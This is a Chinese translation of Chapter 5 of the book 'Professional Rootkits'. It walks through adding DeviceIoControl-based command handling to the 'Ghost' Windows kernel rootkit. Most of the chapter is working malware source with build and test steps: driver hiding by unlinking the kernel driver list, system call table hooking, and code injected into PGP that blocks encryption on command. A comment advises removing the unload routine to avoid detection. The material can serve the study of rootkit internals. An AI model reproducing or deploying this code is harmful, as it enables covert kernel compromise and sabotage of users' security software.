
# Professional.Rootkits 第五章（更新完毕）

> 原文：[`www.pediy.com/kssd/pediy10/70828.html`](https://www.pediy.com/kssd/pediy10/70828.html)

## 第五章：I/O 处理

### 概述

本章向你介绍 I/O 处理系统。I/O 处理、命名管道，和共享内存这些可以用来有效地实现内核模式和用户模式进程间的通信。在这三种方式中，I/O 处理可能是最容易理解和实现的了。因为我们的 `rootkit` 是作为一个设备驱动程序加载到内核内存中执行，控制应用程序通常被加载到用户内存，因此就需要这种通信方式。除了各自的内存区域外，内核和用户模式进程通常使用各自的堆栈。这就有效地阻止了利用函数传递参数，即使你可以从一个交替内存区域标识一个函数的位置。

本章包括如下内容：

- `DeviceIoControl` 函数
- 一个基本的 `rootkit` 控制应用程序
- 基本的 I/O 处理在 `rootkit` 中的应用
- 一个基本的 `rootkit` 命令
- 测试一个基本的 `rootkit` 命令

### 使用 `DeviceIoControl`

`Rootkit` 通常作为设备驱动程序来执行，通常需要与外部用户层应用程序通信的能力。这些外部应用程序使用不同的堆栈和不同的内存空间；他们可以使用不同的函数并在不同的权限级别下操作。在驱动程序和应用程序间实现通信必须通过一个不被上述因素影响的通道来实现。这个通信通道由 `DeviceIoControl` 函数提供。图 5-1 所示基本 I/O 控制模型。

**图 5-1**

本章这个详细的例子将为 `rootkit` 增加一个开/关转换。这个开/关转换将由一个标准的 Windows 控制台程序控制，并通过 `DeviceIoControl` 与 `rootkit` 进行通讯。在原始的 PGP 加密函数前，在注入函数（added in Chapter 4）被调用时将需要 `DeviceIoControl`。这样可以使注入函数检测开/关转换状态从而确定允许进程还是封锁进程。

这个函数功能需要通过创建三个新文件和修改四个已有文件来控制 `rootkit` 本地执行。

新文件如下：

- `Controller.c`
- `IoManager.c`
- `IoManager.h`

下面是要修改的文件：

- `Ghost.c`
- `Ghost.h`
- `injectManager.c`
- `SOURCES`

### 控制台应用程序

应用程序用来控制 `rootkit`，简单来说就是需要接受一个开或关的命令并将命令传送给 `rootkit`。这是通过 `rootkit` 打开已发布设备驱动并通过 `DeviceIoControl` 来发送一条指令来完成的。

代码如下节所示。

#### `Controller.c`

文件 `Controller.c` 接受一个开或关的命令并发送 `GHOST_ON` 或 `GHOST_OFF` 给在 `GHOST_DEVICE_OPEN_NAME` 中所找到的设备驱动。这些定义已经被增加到一个新文件 `IoManager.h` 中。这个新文件可以被任何需要与 `rootkit` 通讯的应用程序包括：

```c
// Controller
// Copyright Ric Vieler, 2006
// Send an on/off command to MyDeviceDriver

#include <windows.h>
#include <stdio.h>
#include <io.h>
#include "IoManager.h"

void main(int argc, char *argv[])
{
  HANDLE deviceHandle;
  GHOST_IOCTLDATA control = { 0 };
  ULONG status = 0;
  if(( argc < 2 ) || ((stricmp(argv[1],"on") != 0)) && ((stricmp(argv[1],"off") != 0)))
  {
    printf ("Use Controller on\n");
    printf ("or   Controller off\n");
    return;
  }
  deviceHandle = CreateFile( GHOST_DEVICE_OPEN_NAME,
    GENERIC_READ | GENERIC_WRITE,
    0,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL);
  if (deviceHandle == INVALID_HANDLE_VALUE)
  {
    printf ("Could not find MyDeviceDriver.\n");
    return;
  }
  if(stricmp(argv[1],"on") == 0)
    control.command = GHOST_ON;
  else
    control.command = GHOST_OFF;
  if( DeviceIoControl(deviceHandle,
    GHOST_ON_OFF_COMMAND,
    &control,
    sizeof(control), // input
    (PVOID)&control,
    sizeof(control), // output
    &status,
    NULL ) )
    printf ("MyDeviceDriver %s.\n", control.command == GHOST_ON ? "on" : "off" );
  else
    printf ("DeviceIoControl failed.\n");
  CloseHandle(deviceHandle);
}
```

#### `IoManager.h`

文件 `IoManager.h` 提供了 `rootkit` 和控制程序所需要的函数定义。用来区分不止一个程序使用的单一文件，在别处定义一个关键字，`_GHOST_ROOTKIT_`。`rootkit` 必须定义这个关键字，同时控制程序则不准。这样允许 `rootkit` 和控制程序在不需要控制程序知道任何 `rootkit` 内部结构的前提下来共享 I/O 通讯定义：

```c
// Copyright Ric Vieler, 2006
// Definitions for Ghost IO control

#ifndef _GHOST_IO_H_
#define _GHOST_IO_H_

// Use CreateFile( GHOST_DEVICE_OPEN_NAME,,, externally
// Use GHOST_DEVICE_CREATE_NAME internally to create device
// Use GHOST_DEVICE_LINK_NAME internally to create device link

#define GHOST_DEVICE_CREATE_NAME L"\\Device\\MyDeviceDriver"
#define GHOST_DEVICE_LINK_NAME L"\\DosDevices\\MyDeviceDriver"
#define GHOST_DEVICE_OPEN_NAME "\\\\.\\MyDeviceDriver"

// Set command = GHOST_ON or GHOST_OFF for GHOST_ON_OFF_COMMAND
// Get command = GHOST_ON or GHOST_OFF for GHOST_STATUS_COMMAND

typedef struct
{
  Int    command;
} GHOST_IOCTLDATA;

// definitions from ntddk.h
// (these won't be defined in user mode apps)

#ifndef CTL_CODE
#define CTL_CODE( DeviceType, Function, Method, Access ) (            \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)
#endif

#ifndef FILE_DEVICE_UNKNOWN
#define FILE_DEVICE_UNKNOWN 0x00000022
#endif

#ifndef METHOD_BUFFERED
#define METHOD_BUFFERED 0
#endif

#ifndef FILE_ANY_ACCESS
#define FILE_ANY_ACCESS 0
#endif

// Use these to command the rootkit!

#define GHOST_ON_OFF_COMMAND CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED,
FILE_ANY_ACCESS)
#define GHOST_STATUS_COMMAND CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED,
FILE_ANY_ACCESS)

#define GHOST_OFF 0
#define GHOST_ON 1

// Internal functions

#ifdef _GHOST_ROOTKIT_
NTSTATUS  OnDeviceControl( PFILE_OBJECT FileObject, BOOLEAN Wait,
  PVOID InputBuffer, ULONG InputBufferLength,
  PVOID OutputBuffer, ULONG OutputBufferLength,
  ULONG IoControlCode, PIO_STATUS_BLOCK IoStatus,
  PDEVICE_OBJECT DeviceObject );
NTSTATUS OnDispatch( PDEVICE_OBJECT DeviceObject, PIRP Irp );
#endif

#endif
```

#### `buildController.bat`

如同 `SCMLoader.c` 和 `SCMUnloader.c` 的情况一样，`Controller.c` 可以使用如下命令或一个方便的批处理文件来编译完成：

```
cl -nologo -W3 -O2 Controller.c /link /NOLOGO user32.lib advapi32.lib
```

### 设备驱动内部的 IO 处理

在编译完 `Controller.c` 后，可以使用 `Controller.exe` 来向 `rootkit` 发送开或关的命令。然而，需要增强 `rootkit` 来处理这些命令。为了达到这一目的 `Ghost.c`、`Ghost.h`、`injectManager.c` 和 `SOURCES` 需要被修改，并且 `IoManager.c` 需要被创建。

对 `Ghost.h` 文件进行如下修改：

```c
// Flag for IoManager.h
#define _GHOST_ROOTKIT_
```

对 `Ghost.c` 进行如下修改：

```c
#include "IoManager.h"
```

包含这个文件后，与 `Controller.c` 文件所包含的一样，这是为了提供一致的通讯定义。`Ghost.c` 文件也需要这个文件中的两个函数原型 `OnDeviceControl` 和 `OnDispatch` 位于 `IoManager.h` 文件末端，因此在 `Ghost.h` 中定义 `_GHOST_ROOTKIT_`。

```c
// Global state data
BOOL allowEncryption = TRUE;
```

增加这个全局变量来标记加密处理的开/关状态。

```c
VOID OnUnload( IN PDRIVER_OBJECT theDriverObject )
{
  UNICODE_STRING deviceLink = { 0 };
  // remove device controller
  RtlInitUnicodeString( &deviceLink, GHOST_DEVICE_LINK_NAME );
  IoDeleteSymbolicLink( &deviceLink );
  IoDeleteDevice( theDriverObject->DeviceObject );
  DbgPrint("comint32: Device controller removed.");
  
  // Unhook any hooked functions and return the Memory Descriptor List
  if( NewSystemCallTable )
  {
    UNHOOK( ZwMapViewOfSection, OldZwMapViewOfSection );
    MmUnmapLockedPages( NewSystemCallTable, pMyMDL );
    IoFreeMdl( pMyMDL );
  }
  DbgPrint("comint32: Hooks removed.");
}
```

`OnUnload` 被更改来解除链接并删除在 `DriverEntry` 中创建的设备驱动。

```c
NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING theRegistryPath )
{
  DRIVER_DATA* driverData;
  UNICODE_STRING  deviceName = { 0 };
  UNICODE_STRING deviceLink = { 0 };
  PDEVICE_OBJECT pDeviceController;
  
  // Get the operating system version
  PsGetVersion( &majorVersion, &minorVersion, NULL, NULL );
  
  // Major = 4: Windows NT 4.0, Windows Me, Windows 98 or Windows 95
  // Major = 5: Windows Server 2003, Windows XP or Windows 2000
  // Minor = 0: Windows 2000, Windows NT 4.0 or Windows 95
  // Minor = 1: Windows XP
  // Minor = 2: Windows Server 2003
  
  if ( majorVersion == 5 && minorVersion == 2 )
  {
    DbgPrint("comint32: Running on Windows 2003");
  }
  else if ( majorVersion == 5 && minorVersion == 1 )
  {
    DbgPrint("comint32: Running on Windows XP");
  }
  else if ( majorVersion == 5 && minorVersion == 0 )
  {
    DbgPrint("comint32: Running on Windows 2000");
  }
  else if ( majorVersion == 4 && minorVersion == 0 )
  {
    DbgPrint("comint32: Running on Windows NT 4.0");
  }
  else
  {
    DbgPrint("comint32: Running on unknown system");
  }
  
  // Hide this driver
  driverData = *(((DRIVER_DATA**)((DWORD)pDriverObject + 20)));
  if( driverData != NULL )
  {
    // unlink this driver entry from the driver list
    *(((PDWORD)driverData->listEntry.Blink)) = (DWORD)driverData->listEntry.Flink;
    driverData->listEntry.Flink->Blink = driverData->listEntry.Blink;
  }
  
  // Configure the controller connection
  if( !NT_SUCCESS( Configure() ) )
  {
    DbgPrint("comint32: Configure failed!\n");
    return STATUS_UNSUCCESSFUL;
  }
  
  // Add kernel hooks
```



# DriverEntry 修改说明

```
if( !NT_SUCCESS( HookKernel() ) )
{
  DbgPrint("comint32: HookKernel failed!\n");
  return STATUS_UNSUCCESSFUL;
}
// Assign device controller
RtlInitUnicodeString( &deviceName, GHOST_DEVICE_CREATE_NAME );
IoCreateDevice( pDriverObject,
  0,
  &deviceName,
  FILE_DEVICE_UNKNOWN,
  0,
  FALSE,
  &pDeviceController );
RtlInitUnicodeString( &deviceLink, GHOST_DEVICE_LINK_NAME );
IoCreateSymbolicLink( &deviceLink, &deviceName );
pDriverObject->MajorFunction[IRP_MJ_CREATE] =
pDriverObject->MajorFunction[IRP_MJ_CLOSE] =
pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]  = OnDispatch;
// Comment out in free build to avoid detection
pDriverObject->DriverUnload = OnUnload;
return STATUS_SUCCESS;
}
```

对 `DriverEntry` 做几处更改。第一个是增加两个 `UNICODE_STRINGs` 和一个 `PDEVICE_OBJECT`。它们是用来创建向外部应用程序发送命令的控制设备驱动。`IoCreateDevice` 创建实际设备驱动，然而 `IoCreateSymbolicLink` 使得驱动可以通过使用 `GHOST_DEVICE_OPEN_NAME` 来访问。最后，三个 `MajorFunctions` 被挂钩以便 `Ghost` 可以处理指向重新创建的驱动程序的 `IRP_MJ_CREATE`、`IRP_MJ_CLOSE` 和 `IRP_MJ_DEVICE_CONTROL` 命令。这是只有 `IRP_MJ_DEVICE_CONTROL` 将被处理。挂钩 `IRP_MJ_CREATE`、`IRP_MJ_CLOSE` 简单的演示了通过允许未处理的命令来“穿过”设备驱动处理程序来挂钩任何 `MajorFunction` 的能力。

## IoManager.c

通过增加 `IoManager.c` 文件来处理 `DriverEntry` 中被请求的 I/O 命令；分别是 `IRP_MJ_CREATE`、`IRP_MJ_CLOSE` 和 `IRP_MJ_DEVICE_CONTROL`。在 `IoManager.c` 的迭代中，只有 `IRP_MJ_DEVICE_CONTROL` 被处理；`IRP_MJ_CREATE` 和 `IRP_MJ_CLOSE` 只是为了演示怎样处理无句柄 I/O 而增加的：

```
// IoManager
// Copyright Ric Vieler, 2006
// Process remote IO
#include "ntddk.h"
#include "Ghost.h"
#include "IoManager.h"
extern BOOL allowEncryption;
// Process commands from external applications
NTSTATUS  OnDeviceControl( PFILE_OBJECT FileObject, BOOLEAN Wait,
 PVOID InputBuffer, ULONG InputBufferLength,
 PVOID OutputBuffer, ULONG OutputBufferLength,
 ULONG IoControlCode, PIO_STATUS_LOCK IoStatus,
 PDEVICE_OBJECT DeviceObject )
{
 GHOST_IOCTLDATA* pControlData;
 IoStatus->Status      = STATUS_SUCCESS;
 IoStatus->Information = 0;
 switch ( IoControlCode )
 {
  case GHOST_ON_OFF_COMMAND:
   if(InputBufferLength >= sizeof(GHOST_IOCTLDATA))
   {
    pControlData = (GHOST_IOCTLDATA*)InputBuffer;
    if(pControlData->command == GHOST_ON)
    {
     // block PGP encryption
     allowEncryption = FALSE;
     DbgPrint (("comint32: blocking encryption"));
    }
    else
    {
     // allow PGP encryption
     allowEncryption = TRUE;
     DbgPrint (("comint32: allowing encryption"));
    }
   }
   return IoStatus->Status;
  case GHOST_STATUS_COMMAND:
   if(OutputBufferLength >= sizeof(GHOST_IOCTLDATA))
   {
    pControlData = (GHOST_IOCTLDATA*)OutputBuffer;
    if(allowEncryption == TRUE)
     pControlData->command = GHOST_OFF;
    else
     pControlData->command = GHOST_ON;
   }
   IoStatus->Information = sizeof(GHOST_IOCTLDATA);
   return IoStatus->Status;
  default:
   IoStatus->Information = 0;
   IoStatus->Status = STATUS_NOT_SUPPORTED;
   return IoStatus->Status;
 }
 return STATUS_SUCCESS;
}
// Process IRP_MJ_CREATE, IRP_MJ_CLOSE and IRP_MJ_DEVICE_CONTROL
NTSTATUS OnDispatch( PDEVICE_OBJECT DeviceObject, PIRP Irp )
{
 PIO_STACK_LOCATION irpStack;
 PVOID inputBuffer;
 PVOID outputBuffer;
 ULONG inputBufferLength;
 ULONG outputBufferLength;
 ULONG ioControlCode;
 NTSTATUS status;
 // go ahead and set the request up as successful
 Irp->IoStatus.Status    = STATUS_SUCCESS;
 Irp->IoStatus.Information = 0;
 // Get the IRP stack
 irpStack = IoGetCurrentIrpStackLocation (Irp);
 // Get the buffers
 inputBuffer = Irp->AssociatedIrp.SystemBuffer;
 inputBufferLength = irpStack->Parameters.DeviceIoControl.InputBufferLength;
 outputBuffer = Irp->AssociatedIrp.SystemBuffer;
 outputBufferLength = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
 // Get the control code
 ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
 switch (irpStack->MajorFunction)
 {
  case IRP_MJ_DEVICE_CONTROL:
   status = OnDeviceControl( irpStack->FileObject, TRUE,
    inputBuffer, inputBufferLength,
    outputBuffer, outputBufferLength,
    ioControlCode, &Irp->IoStatus, DeviceObject );
   break;
 }
 IoCompleteRequest( Irp, IO_NO_INCREMENT );
 return status;
}
```

`OnDispatch` 处理设备 I/O 并传递设备驱动控制命令给 `OnDeviceControl`。`OnDeviceControl` 处理 `GHOST_ON_OFF_COMMAND` 和 `GHOST_STATUS_COMMAND` 命令并为其他处理返回 `STATUS_NOT_SUPPORTED`。`GHOST_ON_OFF_COMMAND` 已经解释过了。`GHOST_STATUS_COMMAND` 是一个命令，将被从被从注入的加密前函数发送到确定 PGP 编码是否应该被分块。

## SOURCES

和所有新被添加到 rootkit 中的文件一样，`IoManager.c` 也要被添加到 `SOURCES` 中。

```
TARGETNAME=comint32
TARGETPATH=OBJ
TARGETTYPE=DRIVER
SOURCES=Ghost.c\
 fileManager.c\
 IoManager.c\
 hookManager.c\
 configManager.c
```

最后，这是增加到被注入函数的代码，增加 `beforeEncode` 到 `injectManager.c` 中：

```
DWORD beforeEncode( PDWORD stack, DWORD* callbackReturn, IN_PROCESS_DATA* pCallData
)
{
void* contextPtr = (void*)stack[1];
PGPOptionList* optionListPtr = (PGPOptionList*)stack[2];
DWORD dwRet = (DWORD)TRUE;
int index;
int inputType = 0;
void* lpBuffer;
DWORD dwInBufferLen = 0;
PGPOption* currentOption = optionListPtr->options;
PFLFileSpec* fileSpec;
HANDLE deviceHandle;
GHOST_IOCTLDATA control = { 0 };
ULONG status = 0;
// Look at the options in the option list
for( index = 0; index < optionListPtr->numOptions; index++)
{
 if( currentOption->type == 1 )
 {
  // File Input
  inputType = 1;
  fileSpec = (PFLFileSpec*)currentOption->value;
  lpBuffer = fileSpec->data;
  dwInBufferLen = (DWORD)pCallData->plstrlenA((LPCSTR)(lpBuffer));
  break;
 }
 else if( currentOption->type == 2 )
 {
  // Buffer Input
  inputType = 2;
  lpBuffer = (void*)currentOption->value;
  dwInBufferLen = (DWORD)currentOption->valueSize;
  break;
 }
 currentOption++;
}
// Process buffer or file before encryption
if(( inputType == 1 || inputType == 2 ) && ( dwInBufferLen > 0 ))
{
 deviceHandle = pCallData->pCreateFileA( pCallData->deviceString,
  GENERIC_READ | GENERIC_WRITE,
  0,
  NULL,
  OPEN_EXISTING,
  FILE_ATTRIBUTE_NORMAL,
  NULL);
 if (deviceHandle != INVALID_HANDLE_VALUE)
 {
  if( pCallData->pDeviceIoControl( deviceHandle,
   GHOST_STATUS_COMMAND,
   &control,
   sizeof(control), // input
   (PVOID)&control,
   sizeof(control), // output
   &status,
    NULL ) )
   {
    if(control.command == GHOST_ON)
    {
     // blocking encryption
     dwRet = (DWORD)FALSE;
     *callbackReturn = PGP_BAD_API;
     pCallData->pOutputDebugStringA(pCallData->denyString);
    }
    else
    {
     pCallData->pOutputDebugStringA(pCallData->allowString);
    }
   }
   pCallData->pCloseHandle(deviceHandle);
  }
 }
 return dwRet;
}
```

增加的 `beforeEncode` 应该看起来很熟悉，因为这个代码非常像 `Controller.c` 中使用过的。唯一的不同是这个命令是发送给设备控制程序的并且从结果变化上看代码是在一个被注入函数的内部被执行的。

# 被注入函数程序设计

现在应该是指出应用程序设计和被注入函数设计的不同之处的时候了。如果你仔细的看过 `beforeEncode`，你将注意到其中没有库函数调用。这是因为被注入函数没有通过基本应用加载库的概念。`Ghost` 通过使用 `ZwMapViewOfSection` 来查找所需函数的地址并将这些地址传递给 `IN_PROCESS_DATA` 结构中的被注入函数的方法来避免这个问题。不幸的是，这个函数指向 `IN_PROCESS_DATA` 附近将不能使用被注入函数中定义的局部变量，因此必须通过传值来传递函数，或者通过传递地址，这个地址必须在 `IN_PROCESS_DATA` 结构中传递。

## 测试 I/O 控制

为了测试开发到现在的所有功能，你需要通过 Checked DDK 命令提示符编译第五章的 `Ghost`。`SCMUnloader.exe`、`SCMLoader.exe` 和 `Controller.exe` 也同样需要编译构建。另外，你需要 PGP 版本 9，虽然如果修正 SDK 动态链接库名字并将加密前函数样式与你的 rootkit 版本统一。

复制 `SCMUnloader`、`SCMLoader`、`Controller` 和 `Chapter05Ghost\objchk\i386\comint32.sys` 文件到 `C:\` 目录下。

执行 `DebugView` 来监视 rootkit。

如果 rootkit 之前被加载过，你将需要运行 `SCMUnloader` 来卸载已存在的 rootkit。这是因为 `SCMLoader` 允许一个注册条目告诉运行中的操作系统加载，但是不会开始运行 rootkit。

加载并运行 rootkit。根据 `DebugView` 的记录来修正一些错误的情况直到 rootkit 成功加载并运行。



## 操作步骤

1. 从 `PGP` 系统托盘图标选择打开 `PGP Desktop`。如图 5-2 所示。
2. 在 `PGP Desktop` 界面中选择 `File` => `New` => `PGP Zip`。在 `PGP Zip` 窗口中选择 `Add Recipients` 按钮。如图 5-3 所示选择一个收件人。
3. 从 `Recipient Selection` 对话框中选择任意一个收件人并点击 `OK`。这样将返回到 `PGP Zip` 窗口。拖放任意文件到 `PGP Zip` 窗口的下部界面并点击 `Save` 按钮。如图 5-4 对话框所示保存 `PGP Zip`。
4. 使用由对话框提供的默认文件名保存并再次点击 `Save`。最后一步，`PGP Desktop` 将要求输入解密文档时所需要的 `passphrase`（通过短语）。输入你的 `passphrase`（通过短语）来启动加密程序。如图 5-5 所示输入一个 `PGP passphrase`（通过短语）。

## 故障排除

如果 `rootkit` 分块进行加密将出现一个错误信息，通常是一个 `DLL` 不匹配信息。拿 `PGP` 版本 9 来说，这个错误消息是“`Unable to save`（无法保存）(`library version too old or too new`（库版本太旧或太新）)”如图 5-6 所示 `PGP` 加密失败。

现在在 `Controller.exe` 所在目录输入命令“`controller off`”。你将在命令提示符中看到返回信息“`MyDeviceDriver off`”并在 `DebugView` 中看到“`comint32: allowing encryption`”。

关闭 `PGP Desktop`。

现在尝试相同的早期加密形式。被选择文件将被加密保存。

## 总结

我们现在拥有了具有如下功能的 `rootkit`：

*   隐藏设备驱动程序条目
*   隐藏配置文件
*   挂钩操作系统内核
*   挂钩操作系统加载进程中的被选进程
*   从用户模式应用程序发送进程指令

通过对 `I/O` 处理的基本了解，你现在可以开始准备解决通讯和驱动过滤。通讯功能可以使 `rootkit` 与远程控制程序连接，同时驱动过滤可以使 `rootkit` 将自身注入到操作系统底层。第六章包含底层通讯，第七章介绍驱动过滤。
